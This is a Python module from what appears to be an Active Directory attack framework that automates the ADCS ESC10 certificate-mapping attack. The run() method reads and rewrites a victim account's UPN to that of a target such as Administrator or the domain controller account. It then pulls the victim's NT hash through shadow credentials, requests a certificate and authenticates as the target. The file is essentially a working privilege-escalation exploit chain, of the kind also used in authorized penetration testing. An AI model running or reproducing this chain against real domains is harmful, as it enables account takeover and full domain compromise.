import os

from pathlib import Path
from module import BaseModule
from tool import Tool

class ADCSESC10(BaseModule):
    name = "ADCS - ESC10"
    path = "adcs/esc10"
    description = "ESC10: Weak Certificate Mapping for Schannel Authentication"

    info = """When a user presents a certificate for authentication via Schannel, if the certificate's UPN SAN matches a user in AD and the Issuer matches a trusted CA, the user is authenticated as that user. Weak controls allow an attacker with a forged certificate to bypass authentication.

Prerequisites:
  - The environment uses certificate mapping for authentication (e.g., for smart cards or VPNs).
  - The mapping is based solely on the UPN in the SAN and a trusted issuer, without validating the certificate's revocation status or other security measures."""
    
    options = {
        "ca_host": {"default": "", "description": "ADCS CA Server IP or host address", "required": True},
        "ca_name": {"default": "", "description": "ADCS CA Name", "required": True},
        "dc_ip": {"default": "", "description": "DC IP or host address. If empty, domain will be used.", "required": False},
        "template": {"default": "User", "description": "ESC10 vulnerable template", "required": True},
        "victim": {"default": "", "description": "Username that the attacker can modify the UPN for", "required": True},
        "target_account": {"default": "Administrator", "description": "Account to attempt to compromise (this can be the DC$)", "required": False},
        "domain": {"default": "", "description": "Auth: Domain name (FQDN)", "required": True},
        "username": {"default": "", "description": "Auth: Username", "required": True},
        "password": {"default": "", "description": "Auth: Password or NT Hash (for NTLM auth only)", "required": False},
        "auth": {"default": "ntlm", "description": "Auth: Type (ntlm, krb)", "required": True},
    }
    
    def __init__(self, registry, job_manager):
        super().__init__(registry, job_manager)

    async def run(self):
        if not self.validate_options():
            return

        os.chdir(self.logs_dir)
        tool = Tool(self)
        if not tool.set_auth(from_module=True):
            return

        self.opts.target_account = self.opts.target_account.lower()
        pfx = self.uniq_filename(self.opts.target_account)

        tool.title("Read Target User UPN")
        if not await tool.certipy_account('read', ['-user', self.opts.victim]):
            return

        if not tool.upn:
            return

        target_upn = tool.upn
        self.pane_b.write(f"[green][*] Found upn: {target_upn}[/green]")

        tool.title("Update the victim account's UPN to the target account's")
        if not await tool.certipy_account('update', ['-user', self.opts.victim, '-upn', self.opts.target_account]):
            return

        ccache = Path(f"{self.opts.victim}.ccache")
        if ccache.exists():
            ccache.unlink()

        tool.title("Use shadow credentials on the victim account")
        if not await tool.certipy_shadow(self.opts.victim):
            return

        if not tool.nthash:
            return

        victim_nthash = tool.nthash
        self.pane_b.write(f"[green][*] Found NT Hash: {victim_nthash}[/green]")

        tool.title("Request a certificate as the victim user")

        if ccache.exists():
            self.pane_b.write(f"[green][*] Obtained ccache for: {self.opts.victim}[/green]")
            if not tool.set_auth(auth="krb", domain=self.opts.domain, username=self.opts.victim):
                return
        else:
            if not tool.set_auth(auth="ntlm", domain=self.opts.domain, username=self.opts.victim, password=victim_nthash):
                return

        if not await tool.certipy_req(['-template', self.opts.template, '-out', pfx]):
            return

        tool.title("Rollback UPN Modification")
        if not tool.set_auth(from_module=True):
            return
        if not await tool.certipy_account('update', ['-user', self.opts.victim, '-upn', self.opts.victim]):
            return

        tool.title("Authenticate as the target user using the obtained certificate")
        if not await tool.certipy_auth(pfx, ['-no-save']):
            return

        self.pane_b.write("[bold green][*] Attack successful.[/bold green]")
